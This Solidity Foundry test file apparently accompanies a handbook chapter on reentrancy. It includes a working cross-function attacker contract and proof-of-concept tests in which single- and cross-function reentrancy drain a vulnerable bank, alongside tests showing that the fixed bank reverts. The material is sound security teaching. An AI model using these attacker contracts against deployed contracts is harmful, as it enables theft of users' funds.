// SPDX-License-Identifier: MIT
// 配套章节：04 重入攻击 ｜ 被测合约：practice-example-code/01-Reentrancy.sol
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableBank, ReentrancyAttacker, SafeBank} from "handbook/01-Reentrancy.sol";

/// @notice 跨函数重入：回调中把"尚未清零"的余额转给同伙
contract CrossFunctionAttacker {
    VulnerableBank public immutable bank;
    address public immutable accomplice;

    constructor(VulnerableBank _bank, address _accomplice) {
        bank = _bank;
        accomplice = _accomplice;
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        bank.transfer(accomplice, msg.value);
    }
}

contract ReentrancyTest is Test {
    VulnerableBank vuln;
    SafeBank safe;
    address victim = makeAddr("victim");
    address accomplice = makeAddr("accomplice");

    receive() external payable {}

    function setUp() public {
        vuln = new VulnerableBank();
        safe = new SafeBank();
        vm.deal(victim, 20 ether);
        vm.startPrank(victim);
        vuln.deposit{value: 10 ether}();
        safe.deposit{value: 10 ether}();
        vm.stopPrank();
    }

    function test_PoC_SingleFunctionReentrancyDrainsBank() public {
        ReentrancyAttacker attacker = new ReentrancyAttacker(vuln);
        attacker.attack{value: 1 ether}();
        assertEq(address(vuln).balance, 0, "bank drained");
        assertEq(address(attacker).balance, 11 ether, "attacker took victim funds");
    }

    function test_Fixed_SingleFunctionReentrancyReverts() public {
        ReentrancyAttacker attacker = new ReentrancyAttacker(VulnerableBank(address(safe)));
        vm.expectRevert("send failed");
        attacker.attack{value: 1 ether}();
        assertEq(address(safe).balance, 10 ether, "victim funds intact");
    }

    function test_PoC_CrossFunctionReentrancyDoublesBalance() public {
        CrossFunctionAttacker attacker = new CrossFunctionAttacker(vuln, accomplice);
        attacker.attack{value: 1 ether}();
        assertEq(vuln.balances(accomplice), 1 ether, "ledger credited twice");
        vm.prank(accomplice);
        vuln.withdraw();
        assertEq(address(attacker).balance + accomplice.balance, 2 ether, "1 ether stolen");
        assertEq(address(vuln).balance, 9 ether, "victim short by 1 ether");
    }

    function test_Fixed_CrossFunctionReentrancyReverts() public {
        CrossFunctionAttacker attacker = new CrossFunctionAttacker(VulnerableBank(address(safe)), accomplice);
        vm.expectRevert("send failed");
        attacker.attack{value: 1 ether}();
    }

    /// @dev 任意金额下，修复版攻击都回滚，受害者资金不变
    function testFuzz_SafeBankAttackNeverProfits(uint96 seed, uint96 stake) public {
        uint256 amount = bound(stake, 1, 100 ether);
        uint256 victimBal = bound(seed, amount, 200 ether); // 银行余额足够时，攻击合约才会发起重入
        SafeBank bank = new SafeBank();
        vm.deal(victim, victimBal);
        vm.prank(victim);
        bank.deposit{value: victimBal}();
        ReentrancyAttacker attacker = new ReentrancyAttacker(VulnerableBank(address(bank)));
        vm.deal(address(this), amount);
        vm.expectRevert("send failed");
        attacker.attack{value: amount}();
        assertEq(address(bank).balance, victimBal);
    }

    /// @dev 漏洞版：银行余额是攻击者存款的整数倍时，银行被提空
    function testFuzz_VulnerableBankDrained(uint8 multiple, uint96 stake) public {
        uint256 unit = bound(stake, 1 gwei, 1 ether);
        uint256 n = bound(multiple, 1, 20);
        VulnerableBank bank = new VulnerableBank();
        vm.deal(victim, unit * n);
        vm.prank(victim);
        bank.deposit{value: unit * n}();
        ReentrancyAttacker attacker = new ReentrancyAttacker(bank);
        vm.deal(address(this), unit);
        attacker.attack{value: unit}();
        assertEq(address(bank).balance, 0);
        assertEq(address(attacker).balance, unit * (n + 1));
    }
}
